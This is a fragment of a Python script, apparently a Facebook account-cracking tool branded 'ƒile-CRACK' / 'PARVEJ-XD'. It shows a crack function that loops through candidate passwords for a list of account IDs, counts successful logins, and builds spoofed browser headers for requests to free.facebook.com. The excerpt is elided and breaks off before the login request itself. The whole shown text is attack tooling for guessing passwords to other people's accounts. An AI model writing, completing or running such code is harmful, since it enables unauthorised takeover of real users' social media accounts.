...
\x1b[38;5;46m______________________________________________________
 ...
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m TOOLS     :   ƒile-CRACK
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [PARVEJ-XD] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			ses.headers.update({"Host":'free.facebook.com','upgrade-insecure-requests': '1','user-agent':ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',"dnt":"1",'x-requested-with': 'XMLHttpRequest','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','referer': 'https://free.facebook.com/',"accept-encoding":"gzip, deflate br",'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',})
